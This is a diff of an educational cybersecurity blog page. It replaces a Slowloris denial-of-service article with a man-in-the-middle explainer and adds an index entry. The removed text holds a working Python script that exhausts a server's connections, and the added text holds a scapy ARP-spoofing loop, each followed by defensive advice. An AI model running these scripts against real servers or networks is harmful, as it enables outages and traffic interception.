@@ -38,87 +38,69 @@
                 </ul>
             </nav>
         </header>
-        <h1>The Slowloris Attack: A Low-Bandwidth Denial of Service</h1><br>
-        <h2>Most Denial of Service (DoS) attacks are brute force, relying on overwhelming a server with a massive volume of traffic from a botnet. The Slowloris attack is different. It’s a stealthy, low-bandwidth attack that can bring down a web server with a single machine and minimal resources.</h2>
+        <h1>The Man-in-the-Middle (MITM) Attack: Eavesdropping on Your Digital Conversations</h1><br>
+        <h2>Imagine you're having a private conversation with a friend, but unbeknownst to you, someone is secretly listening in, and perhaps even altering the messages you exchange. This is the essence of a Man-in-the-Middle (MITM) attack in the digital world. It's a form of cyber eavesdropping where an attacker intercepts and relays communication between two parties who believe they are communicating directly.</h2>
         <br>
-        <h1>How it Works</h1><br>
+        <h1>A Real-World Analogy</h1><br>
         <h2>
-            Instead of flooding the server, Slowloris opens multiple connections and keeps them open for as long as possible. It does this by sending partial HTTP requests, but never completing them. The server, waiting for the requests to finish, keeps the connections open. By slowly and continuously opening new connections, Slowloris can exhaust the server's maximum concurrent connection pool, making it unable to respond to legitimate traffic.
+            Think of it like a postal worker who intercepts your mail. He can read your letters, and even change the contents before passing them on. You and your friend might never know that your conversation has been compromised.
         </h2><br>
-        <h1>The Attack in Detail</h1><br>
+        <h1>The Steps of a MITM Attack</h1><br>
         <h2>
             <ol>
-                <li>The attacker opens multiple connections to the target web server.</li><br>
-                <li>On each connection, the attacker sends a partial HTTP request header.</li><br>
-                <li>The server, expecting the rest of the header, keeps the connection open.</li><br>
-                <li>The attacker periodically sends additional, small pieces of data to keep the connections from timing out.</li><br>
-                <li>As more and more connections are opened and held in this "half-open" state, the server's connection pool becomes saturated.</li><br>
-                <li>Legitimate users are unable to connect to the server, resulting in a Denial of Service.</li>
+                <li><strong>Interception:</strong> The attacker first needs to insert themselves into the conversation. This can be done in several ways, such as creating a fake Wi-Fi hotspot with a convincing name like "Free Airport Wi-Fi" or by exploiting vulnerabilities in a network to redirect traffic.</li><br>
+                <li><strong>Decryption:</strong> Once the attacker is in the middle, they need to be able to read the intercepted traffic. If the communication is unencrypted, this is trivial. If it's encrypted, the attacker will need to use more advanced techniques, such as SSL stripping, to decrypt the data.</li><br>
+                <li><strong>Alteration (Optional):</strong> The attacker can choose to simply eavesdrop on the conversation, or they can actively alter the messages being exchanged. For example, they could change the amount of a financial transaction or inject malicious code into a website.</li><br>
             </ol>
         </h2><br>
-        <h1>How to Perform the Attack</h1><br>
+        <h1>A Technical Example: ARP Spoofing</h1><br>
         <h2>
-            <strong>Disclaimer:</strong> This information is for educational purposes only. Performing a Slowloris attack on a server without explicit permission is illegal and can have serious consequences.
-        </h2><br>
-        <h2>
-            A Slowloris attack can be performed using a simple Python script. The following script demonstrates the basic principle of the attack:
+            One common method for carrying out a MITM attack on a local network is called ARP spoofing. In this attack, the attacker sends forged Address Resolution Protocol (ARP) messages to the local network. These messages associate the attacker's MAC address with the IP address of the gateway (e.g., the router). As a result, all traffic from the victim's machine to the gateway is sent to the attacker's machine instead. The attacker can then forward the traffic to the gateway, but not before reading and potentially altering it.
         </h2><br>
         <pre>
             <code>
-import socket
-import random
-import time
+# This is a conceptual example and will not run without a proper setup.
+# It is for educational purposes only.
 
-target_ip = "X.X.X.X"
-target_port = 80
+from scapy.all import *
 
-connections = []
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
+    send(arp_response, verbose=False)
 
-def create_socket():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-    s.connect((target_ip, target_port))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
-    (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n".encode("utf-8"))
-    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-    return s
+def restore(destination_ip, source_ip):
+    destination_mac = getmacbyip(destination_ip)
+    source_mac = getmacbyip(source_ip)
+    arp_response = ARP(pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac, op='is-at')
+    send(arp_response, count=4, verbose=False)
 
-for _ in range(200):
-    try:
-        s = create_socket()
-        connections.append(s)
-    except socket.error:
-        break
+target_ip = "192.168.1.10"  # The victim's IP
+gateway_ip = "192.168.1.1"  # The router's IP
 
-while True:
-    for s in list(connections):
-        try:
-            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-        except socket.error:
-            connections.remove(s)
-
-    for _ in range(200 - len(connections)):
-        try:
-            s = create_socket()
-            connections.append(s)
-        except socket.error:
-            break
-
-    time.sleep(15)
+try:
+    while True:
+        arp_spoof(target_ip, gateway_ip)
+        arp_spoof(gateway_ip, target_ip)
+        time.sleep(2)
+except KeyboardInterrupt:
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
 
             </code>
         </pre>
-        <h1>Why it's Effective</h1><br>
-        <h2>Slowloris is effective because it doesn't require a lot of bandwidth. It's a "low and slow" attack that can be launched from a single machine. It's also difficult to detect because the traffic it generates looks like legitimate, albeit slow, client traffic.</h2><br>
-        <h1>How to Defend Against a Slowloris Attack</h1><br>
+        <h1>How to Defend Against MITM Attacks</h1><br>
         <h2>
             <ol>
-                <li><strong>Increase the maximum number of connections:</strong> While not a complete solution, increasing the server's connection limit can make it more resilient to Slowloris attacks.</li><br>
-                <li><strong>Set a connection timeout:</strong> Configure the server to close connections that have been idle for too long. This will prevent Slowloris from holding connections open indefinitely.</li><br>
-                <li><strong>Use a reverse proxy:</strong> A reverse proxy can be configured to buffer incoming requests and only forward complete requests to the web server. This can help to mitigate the effects of a Slowloris attack.</li><br>
-                <li><strong>Use a web application firewall (WAF):</strong> A WAF can be configured to detect and block Slowloris attacks.</li>
+                <li><strong>Use HTTPS:</strong> Always look for the padlock icon in your browser's address bar. This indicates that your connection is encrypted with HTTPS, which makes it much more difficult for an attacker to intercept and read your data.</li><br>
+                <li><strong>Be Wary of Public Wi-Fi:</strong> Avoid using public Wi-Fi for sensitive activities like online banking or shopping. If you must use public Wi-Fi, use a VPN to encrypt your traffic.</li><br>
+                <li><strong>Use a VPN:</strong> A Virtual Private Network (VPN) creates a secure, encrypted tunnel between your device and the internet. This makes it much more difficult for an attacker to intercept your traffic.</li><br>
+                <li><strong>Keep Your Software Updated:</strong> Software updates often contain security patches that can help to protect you from MITM attacks.</li>
             </ol>
+        </h2><br>
+        <h1>Conclusion</h1><br>
+        <h2>
+            Man-in-the-Middle attacks are a serious threat to your online security. By understanding how they work and taking the necessary precautions, you can significantly reduce your risk of becoming a victim.
         </h2><br>
         
             <main>
@@ -143,6 +125,15 @@ while True:
                             </strong>
                         </div>
                         <a href="/cybersecurity/slowloris.html" class="read-more">Read &rarr;</a>
+                    </article>
+                    <article class="blog-post">
+                        <div class="blog-post-content">
+                            <h2><a href="/cybersecurity/mitm.html">Man-in-the-Middle Attack</a></h2>
+                            <strong>
+                                <p>An explanation of the Man-in-the-Middle attack, a form of cyber eavesdropping...</p>
+                            </strong>
+                        </div>
+                        <a href="/cybersecurity/mitm.html" class="read-more">Read &rarr;</a>
                     </article>
                     <article class="blog-post">
                         <div class="blog-post-content">
